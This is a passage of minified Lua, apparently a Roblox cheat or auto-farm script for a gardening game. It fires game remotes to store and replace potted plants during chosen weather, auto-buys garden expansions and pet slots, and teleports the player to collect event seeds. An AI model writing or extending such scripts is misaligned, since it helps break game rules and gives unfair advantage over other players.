			return false, "Could not equip Basic Pot"
		end
		local J = false
		local T
		local d = y.Networking and (y.Networking.Garden and y.Networking.Garden.PlantPotted)
		if d and d.OnClientEvent then
			T = d.OnClientEvent:Connect(function(V)
				if Z.GardenItems.PottedPlantWeatherGuard.CleanPlantIdPottedPlantWeatherGuard(V) == G.id then
					J = true
				end
			end)
		end
		local u, q = pcall(function()
			j:Fire(G.id)
		end)
		if not u then
			if T then
				T:Disconnect()
			end
			return false, tostring(q or "Pot action failed")
		end
		local g = os.clock()
		repeat
			task.wait(.05)
		until J or os.clock() - g >= 1.5
		if T then
			T:Disconnect()
			if not J then
				return false, "Pot not confirmed"
			end
		else
			task.wait(.35)
		end
		return true
	end,
	PickUpPlantPottedPlantWeatherGuard = function(G)
		if type(G) ~= "table" or G.id == "" then
			return false
		end
		local V = y.Networking and (y.Networking.PotPlacement and y.Networking.PotPlacement.PickUpPottedPlant)
		if not V or type(V.Fire) ~= "function" then
			return false, "Pickup action unavailable"
		end
		local Z, j = pcall(function()
			V:Fire(G.id)
		end)
		if not Z then
			return false, tostring(j or "Pickup failed")
		end
		return true
	end,
	PlacePottedPlantToolPottedPlantWeatherGuard = function(G, V, j)
		if type(G) ~= "table" or not G.tool or not G.tool.Parent or tostring(G.id or "") == "" or typeof(V) ~= "Vector3" then
			return false, "Potted plant unavailable"
		end
		if not Z.Player.IsToolHeld(G.tool) and not Z.Player.EquipTool(G.tool) then
			return false, "Could not equip potted plant"
		end
		local i = y.Networking and (y.Networking.PotPlacement and y.Networking.PotPlacement.PlacePottedPlant)
		if not i or type(i.Fire) ~= "function" then
			return false, "Place action unavailable"
		end
		local c, J = pcall(function()
			i:Fire(V, tonumber(j) or 0, G.id)
		end)
		if not c then
			return false, tostring(J or "Place failed")
		end
		return true
	end,
	CanStartManualActionPottedPlantWeatherGuard = function()
		local G = Z.GardenItems.PottedPlantWeatherGuard
		if h.potted_weather_guard_enabled == true then
			return false, "Disable Pot Weather Guard to use quick actions"
		end
		if G.ManualBusyPottedPlantWeatherGuard or G.BusyPottedPlantWeatherGuard then
			return false, "A pot action is already running"
		end
		return true
	end;
	CancelManualActionPottedPlantWeatherGuard = function()
		local G = Z.GardenItems.PottedPlantWeatherGuard
		if not G.ManualBusyPottedPlantWeatherGuard then
			return false, "No quick pot action is running"
		end
		G.CancelManualPottedPlantWeatherGuard = true
		return true, "Cancelling pot action"
	end,
	StartPickAllPottedPlantsPottedPlantWeatherGuard = function()
		local G = Z.GardenItems.PottedPlantWeatherGuard
		local V, y = G.CanStartManualActionPottedPlantWeatherGuard()
		if not V then
			return false, y
		end
		G.ManualBusyPottedPlantWeatherGuard = true
		G.BusyPottedPlantWeatherGuard = true
		G.CancelManualPottedPlantWeatherGuard = false
		task.spawn(function()
			local V = 0
			local y = ""
			local Z, j = pcall(function()
				local Z = G.GetMatchingPlantsPottedPlantWeatherGuard(true)
				local j = G.GetActionDelayPottedPlantWeatherGuard()
				for Z, i in ipairs(Z) do
					if G.CancelManualPottedPlantWeatherGuard or h.potted_weather_guard_enabled == true then
						break
					end
					local c, J = G.PickUpPlantPottedPlantWeatherGuard(i)
					if c then
						V += 1
					else
						y = tostring(J or "Pickup failed")
					end
					task.wait(j)
				end
			end)
			local i = G.CancelManualPottedPlantWeatherGuard or h.potted_weather_guard_enabled == true
			G.ManualBusyPottedPlantWeatherGuard = false
			G.BusyPottedPlantWeatherGuard = false
			G.CancelManualPottedPlantWeatherGuard = false
			if not Z then
				warn("[PottedPlantQuickPick]", j)
				g.Notify("Pot pickup failed", 3)
			elseif i then
				g.Notify(string.format("Pot pickup cancelled after %d", V), 3)
			elseif V > 0 then
				g.Notify(string.format("Picked up %d potted plants", V), 3)
			elseif y ~= "" then
				g.Notify(y, 3)
			else
				g.Notify("No placed potted plants found", 3)
			end
		end)
		return true, "Picking up all potted plants"
	end;
	StartPlaceAllPottedPlantsPottedPlantWeatherGuard = function()
		local G = Z.GardenItems.PottedPlantWeatherGuard
		local V, y = G.CanStartManualActionPottedPlantWeatherGuard()
		if not V then
			return false, y
		end
		G.ManualBusyPottedPlantWeatherGuard = true
		G.BusyPottedPlantWeatherGuard = true
		G.CancelManualPottedPlantWeatherGuard = false
		G.ResetStackPlacementPottedPlantWeatherGuard()
		task.spawn(function()
			local V = 0
			local y = ""
			local j, i = pcall(function()
				local j = G.GetPottedPlantToolsPottedPlantWeatherGuard()
				local i = Z.Seeder.GetOccupiedPositions()
				local c = G.GetActionDelayPottedPlantWeatherGuard()
				for Z, j in ipairs(j) do
					if G.CancelManualPottedPlantWeatherGuard or h.potted_weather_guard_enabled == true then
						break
					end
					local J, T, d = G.GetSavedPlacementPottedPlantWeatherGuard(g.PottedPlantWeatherGuardNextStackIndex, i)
					if not J then
						y = tostring(d or "Placement position unavailable")
						break
					end
					local u, E = G.PlacePottedPlantToolPottedPlantWeatherGuard(j, J, T)
					if u then
						V += 1
						g.PottedPlantWeatherGuardNextStackIndex += 1
						q.PositionGrid.Add(i, J)
					else
						y = tostring(E or "Place failed")
					end
					task.wait(c)
				end
			end)
			local c = G.CancelManualPottedPlantWeatherGuard or h.potted_weather_guard_enabled == true
			G.ManualBusyPottedPlantWeatherGuard = false
			G.BusyPottedPlantWeatherGuard = false
			G.CancelManualPottedPlantWeatherGuard = false
			if not j then
				warn("[PottedPlantQuickPlace]", i)
				g.Notify("Potted plant placement failed", 3)
			elseif c then
				g.Notify(string.format("Pot placement cancelled after %d", V), 3)
			elseif V > 0 then
				g.Notify(string.format("Placed %d potted plants", V), 3)
			elseif y ~= "" then
				g.Notify(y, 3)
			else
				g.Notify("No stored potted plants found", 3)
			end
		end)
		return true, "Placing all potted plants"
	end;
	ProtectMatchingPlantsPottedPlantWeatherGuard = function(G)
		local V = Z.GardenItems.PottedPlantWeatherGuard
		local y = V.GetMatchingPlantsPottedPlantWeatherGuard()
		if # y == 0 then
			V.SetStatusPottedPlantWeatherGuard("No matching plants or pots", "#CFCFCF")
			return false
		end
		local j = V.GetEmptyPotToolPottedPlantWeatherGuard()
		local i = math.clamp(math.floor(tonumber(h.potted_weather_guard_max_per_cycle) or 3), 1, 25)
		local c = V.GetActionDelayPottedPlantWeatherGuard()
		local J = 0
		local T = ""
		for y, Z in ipairs(y) do
			if J >= i or h.potted_weather_guard_enabled ~= true then
				break
			end
			local d = "plant:" .. tostring(Z.id)
			if os.clock() < ((g.PottedPlantWeatherGuardRetryAt[d] or 0)) then
				continue
			end
			if not Z.isPotted then
				local G, y = V.PotPlantPottedPlantWeatherGuard(Z, j)
				if not G then
					T = tostring(y or "Pot failed")
					g.PottedPlantWeatherGuardRetryAt[d] = os.clock() + 3
					V.SetStatusPottedPlantWeatherGuard(T, "#FF6666")
					continue
				end
			end
			local u, q = V.PickUpPlantPottedPlantWeatherGuard(Z)
			if u then
				J += 1
				g.PottedPlantWeatherGuardRetryAt[d] = os.clock() + 2
				V.SetStatusPottedPlantWeatherGuard(string.format("Stored %s during %s", Z.plantName, tostring(G or "weather")), "#7CFC00")
				task.wait(c)
			else
				T = tostring(q or "Pickup failed")
				g.PottedPlantWeatherGuardRetryAt[d] = os.clock() + 3
				V.SetStatusPottedPlantWeatherGuard(T, "#FF6666")
			end
		end
		if J == 0 and T == "" then
			V.SetStatusPottedPlantWeatherGuard("Waiting for matching plants", "#CFCFCF")
		end
		return J > 0
	end;
	RestoreMatchingPotsPottedPlantWeatherGuard = function()
		local G = Z.GardenItems.PottedPlantWeatherGuard
		local V = h.potted_weather_guard_selected_plants
		if G.IsSelectionEmptyPottedPlantWeatherGuard(V) then
			G.SetStatusPottedPlantWeatherGuard("Select plants", "#FFCC66")
			return false
		end
		local j = G.GetPottedPlantToolsPottedPlantWeatherGuard()
		local i = math.clamp(math.floor(tonumber(h.potted_weather_guard_max_per_cycle) or 3), 1, 25)
		local c = G.GetActionDelayPottedPlantWeatherGuard()
		local J = Z.Seeder.GetOccupiedPositions()
		local T = 0
		for j, d in ipairs(j) do
			if T >= i or h.potted_weather_guard_enabled ~= true then
				break
			end
			if not G.IsSelectedPottedPlantWeatherGuard(V, d.plantName) then
				continue
			end
			local u = "tool:" .. tostring(d.id)
			if os.clock() < ((g.PottedPlantWeatherGuardRetryAt[u] or 0)) then
				continue
			end
			local E, a, H = G.GetSavedPlacementPottedPlantWeatherGuard(g.PottedPlantWeatherGuardNextStackIndex, J)
			if not E then
				G.SetStatusPottedPlantWeatherGuard(H or "Copy a stack CFrame", "#FFCC66")
				return false
			end
			if not Z.Player.IsToolHeld(d.tool) and not Z.Player.EquipTool(d.tool) then
				g.PottedPlantWeatherGuardRetryAt[u] = os.clock() + 2
				G.SetStatusPottedPlantWeatherGuard("Could not equip potted plant", "#FF6666")
				continue
			end
			local r = y.Networking and (y.Networking.PotPlacement and y.Networking.PotPlacement.PlacePottedPlant)
			if not r or type(r.Fire) ~= "function" then
				G.SetStatusPottedPlantWeatherGuard("Place action unavailable", "#FF6666")
				return false
			end
			local Y, e = pcall(function()
				r:Fire(E, a, d.id)
			end)
			if Y then
				T += 1
				g.PottedPlantWeatherGuardNextStackIndex += 1
				q.PositionGrid.Add(J, E)
				g.PottedPlantWeatherGuardRetryAt[u] = os.clock() + 2
				G.SetStatusPottedPlantWeatherGuard("Restored " .. tostring(d.plantName), "#7CFC00")
				task.wait(c)
			else
				q.PositionGrid.Add(J, E)
				g.PottedPlantWeatherGuardRetryAt[u] = os.clock() + 3
				G.SetStatusPottedPlantWeatherGuard(tostring(e or "Place failed"), "#FF6666")
			end
		end
		if T == 0 then
			G.SetStatusPottedPlantWeatherGuard("Waiting for stored matching pots", "#CFCFCF")
		end
		return T > 0
	end,
	LoopPottedPlantWeatherGuard = function()
		local G = Z.GardenItems.PottedPlantWeatherGuard
		if h.potted_weather_guard_enabled ~= true then
			G.SetStatusPottedPlantWeatherGuard("")
			return false
		end
		if G.BusyPottedPlantWeatherGuard then
			return false
		end
		if G.IsSelectionEmptyPottedPlantWeatherGuard(h.potted_weather_guard_selected_plants) then
			G.SetStatusPottedPlantWeatherGuard("Select plants", "#FFCC66")
			return false
		end
		if G.IsSelectionEmptyPottedPlantWeatherGuard(h.potted_weather_guard_weather_selected) then
			G.SetStatusPottedPlantWeatherGuard("Select weather", "#FFCC66")
			return false
		end
		local V, y = Z.WeatherTriggers.IsActiveWeatherTriggers(true, h.potted_weather_guard_weather_selected)
		if V then
			if g.PottedPlantWeatherGuardLastWeatherActive ~= true then
				G.ResetStackPlacementPottedPlantWeatherGuard()
			end
			g.PottedPlantWeatherGuardLastWeatherActive = true
		else
			g.PottedPlantWeatherGuardLastWeatherActive = false
		end
		G.BusyPottedPlantWeatherGuard = true
		local j, i = pcall(function()
			if V then
				return G.ProtectMatchingPlantsPottedPlantWeatherGuard(y)
			end
			return G.RestoreMatchingPotsPottedPlantWeatherGuard()
		end)
		G.BusyPottedPlantWeatherGuard = false
		if not j then
			G.SetStatusPottedPlantWeatherGuard("System error", "#FF6666")
			warn("[PottedPlantWeatherGuard]", i)
			return false
		end
		return i == true
	end
}
g.GardenExpandStatusText = ""
Z.GardenItems.ExpandSystem = {
	Busy = false,
	Started = false;
	SetStatus = function(G, V)
		g.GardenExpandStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'%s\'>\240\159\143\161 Garden Expansion:</font> <font color=\'#FFFFFF\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or ""))
	end;
	GetCurrentSlot = function()
		local G = tonumber(Z.DataReplica.GetData("OwnedExpansions", 0)) or 0
		return math.clamp(math.floor(G), 0, Z.GardenItems.ExpandSystem.GetMaximumSlot())
	end,
	GetMaximumSlot = function()
		if type(y.ExpansionPrices) ~= "table" then
			return 1
		end
		return math.max(# y.ExpansionPrices, 1)
	end;
	GetPrice = function(G)
		G = tonumber(G)
		if not G or type(y.ExpansionPrices) ~= "table" then
			return nil
		end
		local V = y.ExpansionPrices[G]
		local Z = type(V) == "table" and tonumber(V.Price) or nil
		local j = y.GardenFlags and y.GardenFlags.ExpansionPriceOverrides
		if j and type(j.Get) == "function" then
			local V, y = pcall(function()
				return j:Get()
			end)
			if V and type(y) == "table" then
				Z = tonumber(y[tostring(G)]) or Z
			end
		end
		return Z
	end,
	Loop = function()
		local G = Z.GardenItems.ExpandSystem
		local V = Z.TotalControl.ResolveGardenExpandEnabledTotalControl()
		local j = h.auto_expand_garden == true
		if V ~= nil then
			j = V == true
		end
		if not j then
			g.GardenExpandStatusText = ""
			return false
		end
		if G.Busy then
			return false
		end
		local i = G.GetMaximumSlot()
		local c = Z.TotalControl.ResolveGardenExpandTargetSlotTotalControl(i)
		local J = c ~= nil and c or math.clamp(math.floor(tonumber(h.auto_expand_garden_max_slot) or 2), 1, i)
		J = math.clamp(math.floor(tonumber(J) or 1), 1, i)
		local T = G.GetCurrentSlot()
		if T >= J then
			G.SetStatus(string.format("Slot %d/%d reached", T, J), "#66FF99")
			return false
		end
		local d = T + 1
		local u, E, a = Z.TotalControl.CanBuyGardenExpansionTotalControl(d)
		if u == false then
			G.SetStatus(string.format("Waiting for plants %d/%d", E, a), "#FFCC66")
			return false
		end
		local H = G.GetPrice(d)
		if not H then
			G.SetStatus("Expansion price unavailable", "#FF5555")
			return false
		end
		local r = tonumber(Z.Money.GetSheckles()) or 0
		if r < H then
			G.SetStatus(string.format("Slot %d/%d \226\128\162 Next $%s", T, J, q.formatShecklesNumber(H)), "#FFCC66")
			return false
		end
		local Y = y.Networking and (y.Networking.Actions and y.Networking.Actions.ExpandGarden)
		if not Y or type(Y.Fire) ~= "function" then
			G.SetStatus("Expansion remote unavailable", "#FF5555")
			return false
		end
		G.Busy = true
		G.SetStatus(string.format("Buying slot %d...", d), "#66CCFF")
		local e, s = pcall(function()
			return Y:Fire()
		end)
		if not e or s == false then
			G.Busy = false
			G.SetStatus("Purchase failed", "#FF5555")
			return false
		end
		local N = os.clock()
		repeat
			task.wait(.1)
		until G.GetCurrentSlot() > T or os.clock() - N >= 3
		local W = G.GetCurrentSlot()
		G.Busy = false
		if W > T then
			G.SetStatus(string.format("Expanded to slot %d/%d", W, J), "#66FF99")
			return true
		end
		G.SetStatus("Purchase not confirmed", "#FFCC66")
		return false
	end,
	Start = function()
		local G = Z.GardenItems.ExpandSystem
		if G.Started then
			return false
		end
		G.Started = true
		task.spawn(function()
			while G.Started do
				task.wait(1)
				if Z.SystemPause.IsPausedSystemPause("Garden Expansion") then
					continue
				end
				G.Loop()
			end
		end)
		return true
	end
}
Z.GardenItems.ExpandSystem.Start()
g.PetMaxInventoryStatusText = ""
Z.GardenItems.PetMaxInventorySystem = {
	BusyPetMaxInventorySystem = false;
	StartedPetMaxInventorySystem = false,
	SetStatusPetMaxInventorySystem = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.PetMaxInventoryStatusText = ""
			return false
		end
		g.PetMaxInventoryStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'%s\'>\240\159\144\190 Pet Slots:</font> <font color=\'#FFFFFF\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	GetBaseMaxPetMaxInventorySystem = function()
		local G = y.PetSlotPrices
		local V = type(G) == "table" and tonumber(G.BaseMax) or 3
		return math.max(math.floor(V or 3), 1)
	end;
	GetAbsoluteMaxPetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		local V = y.PetSlotPrices
		local j = G.GetBaseMaxPetMaxInventorySystem()
		if type(V) == "table" and tonumber(V.AbsoluteMax) then
			return math.max(math.floor(tonumber(V.AbsoluteMax) or j), j)
		end
		local i = type(V) == "table" and V.Prices or nil
		if type(i) == "table" then
			return j + # i
		end
		return j
	end,
	GetMaximumUpgradePetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		return math.max(G.GetAbsoluteMaxPetMaxInventorySystem() - G.GetBaseMaxPetMaxInventorySystem(), 0)
	end,
	GetCurrentMaxPetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		local V = tonumber(y.LocalPlayer:GetAttribute("MaxEquippedPets")) or G.GetBaseMaxPetMaxInventorySystem()
		return math.max(math.floor(V), G.GetBaseMaxPetMaxInventorySystem())
	end;
	GetPurchasedCountPetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		local V = G.GetCurrentMaxPetMaxInventorySystem() - G.GetBaseMaxPetMaxInventorySystem()
		return math.clamp(math.floor(V), 0, G.GetMaximumUpgradePetMaxInventorySystem())
	end,
	GetTargetUpgradePetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		local V = G.GetMaximumUpgradePetMaxInventorySystem()
		if V <= 0 then
			return 0
		end
		local y = Z.TotalControl.ResolvePetInventoryTargetUpgradeTotalControl(V)
		if y ~= nil then
			return math.clamp(math.floor(tonumber(y) or 0), 0, V)
		end
		local j = math.floor(tonumber(h.auto_expand_pet_inventory_max_upgrade) or 1)
		return math.clamp(j, 1, V)
	end,
	GetNextPricePetMaxInventorySystem = function(G)
		local V = y.PetSlotPrices
		G = tonumber(G) or Z.GardenItems.PetMaxInventorySystem.GetCurrentMaxPetMaxInventorySystem()
		if type(V) == "table" and type(V.GetNextPrice) == "function" then
			local y, Z = pcall(V.GetNextPrice, G)
			if y and tonumber(Z) then
				return tonumber(Z)
			end
		end
		local j = type(V) == "table" and V.Prices or nil
		if type(j) ~= "table" then
			return nil
		end
		local i = Z.GardenItems.PetMaxInventorySystem
		local c = math.max(math.floor(G - i.GetBaseMaxPetMaxInventorySystem()), 0) + 1
		return tonumber(j[c])
	end;
	GetSpendableShecklesPetMaxInventorySystem = function(G)
		G = tonumber(G) or 0
		local V, y = Z.TotalControl.ResolvePetInventorySpendableShecklesTotalControl(G)
		if V ~= nil then
			return V, tonumber(y) or 0
		end
		if h.pet_inventory_min_sheckles_enabled ~= true then
			return G, 0
		end
		local j = math.max(math.floor(tonumber(h.pet_inventory_min_sheckles) or 0), 0)
		if j <= 0 then
			return G, 0
		end
		return math.max(0, G - j), j
	end,
	LoopPetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		local V = Z.TotalControl.ResolvePetInventoryExpandEnabledTotalControl()
		local j = h.auto_expand_pet_inventory == true
		if V ~= nil then
			j = V == true
		end
		if not j then
			g.PetMaxInventoryStatusText = ""
			return false
		end
		if G.BusyPetMaxInventorySystem then
			return false
		end
		local i = G.GetMaximumUpgradePetMaxInventorySystem()
		if i <= 0 then
			G.SetStatusPetMaxInventorySystem("Pet slot prices unavailable", "#FF5555")
			return false
		end
		local c = G.GetTargetUpgradePetMaxInventorySystem()
		local J = G.GetPurchasedCountPetMaxInventorySystem()
		local T = G.GetCurrentMaxPetMaxInventorySystem()
		if J >= c then
			G.SetStatusPetMaxInventorySystem(string.format("Upgrade %d/%d reached", J, c), "#66FF99")
			return false
		end
		local d = J + 1
		local u = G.GetNextPricePetMaxInventorySystem(T)
		if not u or u <= 0 then
			G.SetStatusPetMaxInventorySystem("Max pet slots reached", "#66FF99")
			return false
		end
		local E = tonumber(Z.Money.GetSheckles()) or 0
		local a, H = Z.TotalControl.CanBuyPetInventoryUpgradeTotalControl(d, E)
		if a == false then
			G.SetStatusPetMaxInventorySystem(string.format("Upgrade %d/%d \226\128\162 Need over $%s", d, c, q.formatShecklesNumber(H)), "#FFCC66")
			return false
		end
		local r, Y = G.GetSpendableShecklesPetMaxInventorySystem(E)
		if r < u then
			local V = u + Y
			local y = Y > 0 and q.formatShecklesNumber(V) or q.formatShecklesNumber(u)
			G.SetStatusPetMaxInventorySystem(string.format("Upgrade %d/%d \226\128\162 Need $%s", d, c, y), "#FFCC66")
			return false
		end
		local e = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestPurchasePetSlot)
		if not e or type(e.Fire) ~= "function" then
			G.SetStatusPetMaxInventorySystem("Pet slot remote unavailable", "#FF5555")
			return false
		end
		G.BusyPetMaxInventorySystem = true
		G.SetStatusPetMaxInventorySystem(string.format("Buying upgrade %d/%d...", d, c), "#66CCFF")
		local s, N = pcall(function()
			return e:Fire()
		end)
		if not s or N == false then
			G.BusyPetMaxInventorySystem = false
			G.SetStatusPetMaxInventorySystem("Purchase failed", "#FF5555")
			return false
		end
		local W = os.clock()
		repeat
			task.wait(.1)
		until G.GetCurrentMaxPetMaxInventorySystem() > T or os.clock() - W >= 3
		local X = G.GetCurrentMaxPetMaxInventorySystem()
		G.BusyPetMaxInventorySystem = false
		if X > T then
			G.SetStatusPetMaxInventorySystem(string.format("Max pets %d/%d", X, G.GetAbsoluteMaxPetMaxInventorySystem()), "#66FF99")
			return true
		end
		G.SetStatusPetMaxInventorySystem("Purchase not confirmed", "#FFCC66")
		return false
	end,
	StartPetMaxInventorySystem = function()
		local G = Z.GardenItems.PetMaxInventorySystem
		if G.StartedPetMaxInventorySystem then
			return false
		end
		G.StartedPetMaxInventorySystem = true
		task.spawn(function()
			while G.StartedPetMaxInventorySystem do
				task.wait(1.5)
				if Z.SystemPause.IsPausedSystemPause("Pet Slot Expansion") then
					continue
				end
				G.LoopPetMaxInventorySystem()
			end
		end)
		return true
	end
}
Z.GardenItems.PetMaxInventorySystem.StartPetMaxInventorySystem()
g.EventSeedCollectStatusText = ""
Z.GardenItems.EventSeedCollectSystem = {
	Busy = false;
	Started = false;
	CurrentItem = nil;
	RetryAt = setmetatable({}, {
		__mode = "k"
	});
	Claim_old = function(G)
		if not h.auto_collect_event_seeds then
			return false
		end
		if not G or not G.Parent then
			return false
		end
		local V = Z.ProximityPrompt.FindProximityPromptByClass(G)
		if not V then
			return false
		end
		local y = g.TeleportLockNames.SeedPackCollector
		Z.Teleport.LockTeleport(y, 5, true)
		local j, i = pcall(function()
			if not Z.TargetPivotTeleport.ToTargetAboveTargetPivotTeleport(G, y) then
				return false
			end
			task.wait(1)
			if not V.Parent then
				return false
			end
			for G = 1, 2, 1 do
				Z.ProximityPrompt.ActivateProximityPrompt(V)
			end
			Z.Teleport.LockTeleport(y, 5, true)
			task.wait(1)
			return true
		end)
		return j and i == true
	end,
	SetStatusEventSeedCollectSystem = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.EventSeedCollectStatusText = ""
			return false
		end
		g.EventSeedCollectStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\177 [Event Seeds]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	GetRootPositionEventSeedCollectSystem = function()
		local G = y.Character
		local V = G and G:FindFirstChild("HumanoidRootPart")
		return V and V.Position or nil
	end;
	IsSeedReadyEventSeedCollectSystem = function(G)
		local V = Z.GardenItems.EventSeedCollectSystem
		if not h.auto_collect_event_seeds or not G or G.Parent ~= y.EventSeedDrops or os.clock() < ((V.RetryAt[G] or 0)) then
			return false
		end
		local j = Z.ProximityPrompt.FindProximityPromptByClass(G)
		if not j or not j.Enabled then
			return false
		end
		local i = Z.Movement.GetPosition(G)
		if not i then
			return false
		end
		return true, j, i
	end;
	GetClosestSeedEventSeedCollectSystem = function()
		local G = Z.GardenItems.EventSeedCollectSystem
		local V = G.GetRootPositionEventSeedCollectSystem()
		if not V or not y.EventSeedDrops or not y.EventSeedDrops.Parent then
			return nil, nil, math.huge
		end
		local j = nil
		local i = nil
		local c = math.huge
		for y, J in ipairs(y.EventSeedDrops:GetChildren()) do
			local T, d, u = G.IsSeedReadyEventSeedCollectSystem(J)
			if T then
				local G = Z.Movement.Distance2D(V, u)
				if G < c then
					j = J
					i = d
					c = G
				end
			end
		end
		return j, i, c
	end;
	Claim = function(G, V)
		local j = Z.GardenItems.EventSeedCollectSystem
		if not h.auto_collect_event_seeds or j.Busy or (not h.garden_items_use_player_walk and Z.TargetPivotTeleport.BusyTargetPivotTeleport) or not G or G.Parent ~= y.EventSeedDrops or os.clock() < ((j.RetryAt[G] or 0)) then
			return false
		end
		V = V and (V.Parent and (V.Enabled and V)) or Z.ProximityPrompt.FindProximityPromptByClass(G)
		if not V or not V.Enabled then
			j.RetryAt[G] = os.clock() + .25
			return false
		end
		j.Busy = true
		j.CurrentItem = G
		local i = g.TeleportLockNames.SeedPackCollector
		if not Z.Teleport.LockTeleport(i, g.PetAndSeedTravelTimeoutSeconds + 2, true) then
			j.CurrentItem = nil
			j.Busy = false
			return false
		end
		local c, J = pcall(function()
			if h.garden_items_use_player_walk then
				j.SetStatusEventSeedCollectSystem("Walking to closest seed", "#FFCC66")
				if not Z.Movement.WalkPathToTarget(G, g.PetAndSeedTravelTimeoutSeconds, i, 10) then
					return false
				end
				V = V and (V.Parent and (V.Enabled and V)) or Z.ProximityPrompt.FindProximityPromptByClass(G)
				if not h.auto_collect_event_seeds or G.Parent ~= y.EventSeedDrops or not V or not V.Parent or not V.Enabled then
					return false
				end
				Z.ProximityPrompt.ActivateProximityPrompt(V)
				return true
			end
			j.SetStatusEventSeedCollectSystem("Staying next to closest seed", "#FFCC66")
			return Z.TargetPivotTeleport.StickToTargetUntilTargetPivotTeleport(G, i, {
				TimeoutTargetPivotTeleport = 5;
				RefreshIntervalTargetPivotTeleport = .15,
				ActionIntervalTargetPivotTeleport = .2;
				RepeatActionTargetPivotTeleport = true,
				ValidateTargetPivotTeleport = function(G)
					if not h.auto_collect_event_seeds or not G or G.Parent ~= y.EventSeedDrops then
						return false
					end
					local V = Z.ProximityPrompt.FindProximityPromptByClass(G)
					return V and (V.Parent and V.Enabled)
				end,
				DoneTargetPivotTeleport = function(G)
					return not G or G.Parent ~= y.EventSeedDrops
				end,
				ActionTargetPivotTeleport = function(G)
					local V = Z.ProximityPrompt.FindProximityPromptByClass(G)
					if V and (V.Parent and V.Enabled) then
						Z.ProximityPrompt.ActivateProximityPrompt(V)
					end
				end
			})
		end)
		if c and J then
			j.RetryAt[G] = os.clock() + 3
			j.SetStatusEventSeedCollectSystem("Claimed closest seed", "#7CFC00")
			Z.Teleport.LockTeleport(i, 5, true)
		else
			j.RetryAt[G] = os.clock() + 1
			if G.Parent ~= y.EventSeedDrops then
				j.SetStatusEventSeedCollectSystem("Seed taken, searching again", "#FFCC66")
			else
				j.SetStatusEventSeedCollectSystem("Retrying closest seed", "#FF6666")
			end
			Z.Teleport.UnlockTeleport(i)
		end
		j.CurrentItem = nil
		j.Busy = false
		if not c then
			warn("[Event Seed Collector]", J)
			return false
		end
		return J == true
	end;
	ClaimClosestSeedEventSeedCollectSystem = function()
		local G = Z.GardenItems.EventSeedCollectSystem
		if not h.auto_collect_event_seeds then
			G.SetStatusEventSeedCollectSystem("")
			return false
		end
		if G.Busy then
			return false
		end
		local V, y, j = G.GetClosestSeedEventSeedCollectSystem()
		if not V then
			G.SetStatusEventSeedCollectSystem("Waiting for seeds", "#CFCFCF")
			return false
		end
		local i = j < math.huge and tostring(math.floor(j + .5)) .. " studs" or "nearby"
		G.SetStatusEventSeedCollectSystem("Locked closest seed " .. i, "#FFCC66")
		return G.Claim(V, y)
	end;
	StartGoldRainbowCollect = function()
		local G = Z.GardenItems.EventSeedCollectSystem
		if G.Started then
			return false
		end
		G.Started = true
		y.EventSeedDrops.ChildAdded:Connect(function()
			task.defer(function()
				G.ClaimClosestSeedEventSeedCollectSystem()
			end)
		end)
		task.spawn(function()
			while G.Started do
				task.wait(.15)
				if not h.auto_collect_event_seeds or G.Busy then
					continue
				end
				G.ClaimClosestSeedEventSeedCollectSystem()
			end
		end)
		return true
	end
}
Z.GardenItems.EventSeedCollectSystem.StartGoldRainbowCollect()
e.RealTimeStats = {
	statusLabel = nil;
	sessionLabel = nil,
	sessionStartedAt = y.Workspace:GetServerTimeNow(),
	lastFullPerformanceDashboardRefresh = 0;
	lastMailboxCountRefreshRealTimeStats = 0;
	mailboxCountRealTimeStats = 0,
	TextSizeScalesRealTimeStats = {
		NormalStatus = .025,
		NormalSession = .021;
		DashboardUser = .029;
		DashboardSheckles = .12;
		DashboardLine = .033;
		DashboardFooter = .04,
		DashboardVersion = .026;
		Minimum = 10;
		Maximum = 64
	};
	GetScaledTextSizeRealTimeStats = function(G, V, y)
		local Z = workspace.CurrentCamera
		local j = 720
		if Z then
			j = math.max(tonumber(Z.ViewportSize.Y) or j, 1)
		end
		local i = math.floor((j * ((tonumber(G) or .025))) + .5)
		return math.clamp(i, tonumber(V) or 10, tonumber(y) or 64)
	end;
	GetTextSizesRealTimeStats = function()
		local G = e.RealTimeStats.TextSizeScalesRealTimeStats
		return {
			normal = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.NormalStatus, 12, 28),
			session = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.NormalSession, 11, 24),
			user = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.DashboardUser, G.Minimum, G.Maximum),
			sheckles = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.DashboardSheckles, G.Minimum, G.Maximum);
			line = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.DashboardLine, G.Minimum, G.Maximum);
			footer = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.DashboardFooter, G.Minimum, G.Maximum);
			version = e.RealTimeStats.GetScaledTextSizeRealTimeStats(G.DashboardVersion, G.Minimum, G.Maximum)
		}
	end,
	EscapeRichTextRealTimeStats = function(G)
		G = tostring(G or "")
		G = G:gsub("&", "&amp;")
		G = G:gsub("<", "&lt;")
		G = G:gsub(">", "&gt;")
		G = G:gsub("\"", "&quot;")
		G = G:gsub("\'", "&apos;")
		return G
	end;
	GetSessionTextRealTimeStats = function()
		local G = math.max(math.floor(((y.Workspace:GetServerTimeNow() - e.RealTimeStats.sessionStartedAt)) + .5), 0)
		local V = math.floor(G / 3600)
		local Z = math.floor(((G % 3600)) / 60)
		local j = G % 60
